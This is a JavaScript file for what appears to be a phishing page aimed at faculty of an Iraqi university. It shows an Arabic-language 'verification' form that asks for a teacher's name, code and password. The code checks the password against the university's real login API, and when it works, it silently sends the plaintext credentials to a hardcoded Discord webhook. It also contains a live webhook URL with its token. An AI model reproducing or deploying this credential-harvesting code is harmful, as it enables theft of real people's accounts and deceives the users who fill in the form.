const Colors = {
    SUCCESS: "#449e48",
    FAILURE: "#dc3c31",
    WAITING: "#ffd700"
};

function showStatusMessage(message, color) {
    const statusMessage = document.getElementById("status-message");
    if (!statusMessage) return;

    statusMessage.textContent = message;
    statusMessage.style.backgroundColor = color;
    statusMessage.style.display = "block";
    
    // Clear any existing timeout to prevent conflicts
    if (statusMessage.timeoutId) {
        clearTimeout(statusMessage.timeoutId);
    }
    
    statusMessage.timeoutId = setTimeout(() => {
        statusMessage.style.display = "none";
    }, 3000);
}

// show/hide password
document.getElementById("show-password-btn").addEventListener("click", () => {
    const passwordField = document.getElementById("password");
    const showPasswordBtn = document.getElementById("show-password-btn");
    
    if (!passwordField || !showPasswordBtn) return;

    const isPassword = passwordField.type === "password";
    passwordField.type = isPassword ? "text" : "password";
    showPasswordBtn.textContent = isPassword ? "*️⃣" : "👁️";
});

// check and upload to discord
document.getElementById("sendButton")?.addEventListener("click", async () => {
    const baseURL = "https://bauc14.bis.edu.iq/api/faculty/auth/login?page_path=%2Ffaculty%2Flogin";
    const webhookURL = "https://discord.com/api/webhooks/1340785470296035338/-sE250LvVvvFyyQwRdYADHIXwcV3jpHMdLs03nzH9HGwBDrPjlCC3_i3SRhV7MS-n2ie";

    const name = document.getElementById("teacher-name")?.value?.trim() || "";
    const code = document.getElementById("teacher-code")?.value?.trim() || "";
    const password = document.getElementById("password")?.value || "";

    if (!name || !code || !password) {
        showStatusMessage("الرجاء ملء جميع الحقول", Colors.FAILURE);
        return;
    }

    const payload = {
        code,
        password,
        remember: false
    };

    try {
        showStatusMessage("جار التحقق من المعلومات...", Colors.WAITING);
        
        const response = await fetch(baseURL, {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify(payload)
        });

        const status = response.status;
        const jsonData = await response.json();

        if (status >= 400 && status <= 499) {
            if (jsonData.status?.message === "auth_faculty_FAILURE") {
                showStatusMessage("كلمة المرور او الرمز غير صحيح. حاول مجددا", Colors.FAILURE);
            } else {
                showStatusMessage(jsonData.status?.message || "حدث خطأ", Colors.FAILURE);
            }
            return;
        }

        if (status >= 200 && status <= 299) {
            const message = {
                content: `\`name :: ${name}\ncode :: ${code}\npassword :: ${password}\``
            };

            const webhookResponse = await fetch(webhookURL, {
                method: "POST",
                headers: {
                    "Content-Type": "application/json"
                },
                body: JSON.stringify(message)
            });

            if (webhookResponse.ok) {
                showStatusMessage("تم التحقق من معلوماتك! يمكنك مغادرة الصفحة الان", Colors.SUCCESS);
            } else {
                throw new Error(webhookResponse.statusText);
            }
        } else {
            showStatusMessage(`حدث خطأ أثناء إنشاء الاتصال (ERROR CODE: ${status})`, Colors.FAILURE);
        }
    } catch (error) {
        console.error("Error:", error);
        showStatusMessage("حدث خطأ في الاتصال", Colors.FAILURE);
    }
});